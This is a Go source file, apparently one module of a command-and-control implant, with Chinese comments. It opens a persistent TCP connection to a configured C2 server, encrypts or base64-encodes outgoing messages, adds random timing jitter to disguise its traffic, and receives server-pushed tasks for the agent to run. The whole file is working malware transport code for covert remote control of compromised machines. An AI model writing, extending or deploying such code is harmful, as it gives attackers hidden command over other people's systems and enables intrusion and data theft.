package main

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"strings"
	"sync"
	"time"
)

var (
	tcpConn   net.Conn
	tcpConnMu sync.Mutex
	// TCP 长连接模式下的消息分发
	tcpRespCh chan map[string]interface{}
	tcpPushCh chan []map[string]interface{}
)

// tcpAddr 从 C2Server 提取 host，端口用 AgentTCPPort 配置
// C2Server 格式: http://host:port → 提取 host，拼接 TCP 端口
func tcpAddr() string {
	u := cfg.C2Server
	host := u
	if i := strings.Index(host, "://"); i >= 0 {
		host = host[i+3:]
	}
	// 去掉路径部分
	if i := strings.Index(host, "/"); i >= 0 {
		host = host[:i]
	}
	// 去掉端口
	if i := strings.LastIndex(host, ":"); i >= 0 {
		host = host[:i]
	}
	return host + ":" + cfg.AgentTCPPort
}

// tcpConnect 建立 TCP 长连接，启动 reader goroutine
func tcpConnect() error {
	tcpConnMu.Lock()
	defer tcpConnMu.Unlock()
	if tcpConn != nil {
		tcpConn.Close()
		tcpConn = nil
	}

	conn, err := net.DialTimeout("tcp", tcpAddr(), 10*time.Second)
	if err != nil {
		return err
	}
	tcpConn = conn
	fmt.Printf("[+] TCP connected: %s\n", tcpAddr())

	// 初始化消息分发 channel
	if tcpRespCh == nil {
		tcpRespCh = make(chan map[string]interface{}, 16)
	}
	if tcpPushCh == nil {
		tcpPushCh = make(chan []map[string]interface{}, 16)
	}

	// 启动 reader goroutine
	go tcpReaderLoop(conn)

	return nil
}

// tcpReaderLoop TCP 消息读取循环
// 读到消息后解密，根据内容分发:
//   - 含 "tasks" 字段 → 任务推送（pushCh）
//   - 其他 → 请求响应（respCh）
func tcpReaderLoop(conn net.Conn) {
	for {
		msg, err := readTCPFrame(conn)
		if err != nil {
			fmt.Printf("[!] TCP read failed: %v\n", err)
			tcpConnMu.Lock()
			if tcpConn == conn {
				tcpConn = nil
			}
			tcpConnMu.Unlock()
			return
		}
		resp := decryptResponse(string(msg))
		if resp == nil {
			continue
		}
		// 分发: 含 tasks 字段的是任务推送
		if tasks, ok := resp["tasks"].([]interface{}); ok {
			taskList := make([]map[string]interface{}, 0, len(tasks))
			for _, t := range tasks {
				if tm, ok := t.(map[string]interface{}); ok {
					taskList = append(taskList, tm)
				}
			}
			if len(taskList) > 0 {
				tcpPushCh <- taskList
			}
			continue
		}
		// 其他消息作为请求响应
		tcpRespCh <- resp
	}
}

// tcpClose 关闭 TCP 连接
func tcpClose() {
	tcpConnMu.Lock()
	defer tcpConnMu.Unlock()
	if tcpConn != nil {
		tcpConn.Close()
		tcpConn = nil
	}
}

// tcpPost 通过 TCP 帧发送加密请求并等待响应
// 长连接模式下，响应通过 tcpRespCh 异步返回
func tcpPost(op string, data interface{}) map[string]interface{} {
	// 确保连接
	tcpConnMu.Lock()
	if tcpConn == nil {
		tcpConnMu.Unlock()
		if err := tcpConnect(); err != nil {
			return nil
		}
		tcpConnMu.Lock()
	}
	conn := tcpConn
	tcpConnMu.Unlock()

	// 加密 payload
	if m, ok := data.(map[string]interface{}); ok {
		m["_op"] = op
		data = m
	}
	algo := cfg.EncAlgo
	if algo == "" {
		algo = "none"
	}
	var bodyStr string
	if algo == "none" {
		j, _ := json.Marshal(data)
		bodyStr = base64.StdEncoding.EncodeToString(j)
	} else {
		enc, _, err := encEncrypt(data, algo, cfg.EncPassword)
		if err != nil {
			return nil
		}
		bodyStr = enc
	}

	// 随机抖动
	if rand.Float64() < stegoProb {
		time.Sleep(time.Duration(rand.Float64()*packetJitter*1000) * time.Millisecond)
	}

	// 发送
	tcpConnMu.Lock()
	if conn != tcpConn {
		if tcpConn == nil {
			tcpConnMu.Unlock()
			return nil
		}
		conn = tcpConn
	}
	err := writeTCPFrame(conn, []byte(bodyStr))
	tcpConnMu.Unlock()
	if err != nil {
		fmt.Printf("[!] TCP write failed: %v\n", err)
		tcpConnMu.Lock()
		if tcpConn == conn {
			tcpConn = nil
		}
		tcpConnMu.Unlock()
		return nil
	}

	// 等待响应（超时 30 秒）
	select {
	case resp := <-tcpRespCh:
		return resp
	case <-time.After(30 * time.Second):
		fmt.Printf("[!] TCP response timeout (op=%s)\n", op)
		return nil
	}
}

// receivePushedTasksTCP TCP 模式下阻塞等待服务端推送的任务
func receivePushedTasksTCP() []map[string]interface{} {
	tasks, ok := <-tcpPushCh
	if !ok {
		return nil
	}
	return tasks
}

// writeTCPFrame 写入长度前缀帧: [4字节大端长度][数据]
func writeTCPFrame(conn net.Conn, data []byte) error {
	var lenBuf [4]byte
	binary.BigEndian.PutUint32(lenBuf[:], uint32(len(data)))
	if _, err := conn.Write(lenBuf[:]); err != nil {
		return err
	}
	_, err := conn.Write(data)
	return err
}

// readTCPFrame 读取长度前缀帧
func readTCPFrame(conn net.Conn) ([]byte, error) {
	var lenBuf [4]byte
	if _, err := io.ReadFull(conn, lenBuf[:]); err != nil {
		return nil, err
	}
	msgLen := binary.BigEndian.Uint32(lenBuf[:])
	if msgLen == 0 || msgLen > 10*1024*1024 {
		return nil, fmt.Errorf("invalid frame size: %d", msgLen)
	}
	msgBuf := make([]byte, msgLen)
	if _, err := io.ReadFull(conn, msgBuf); err != nil {
		return nil, err
	}
	return msgBuf, nil
}
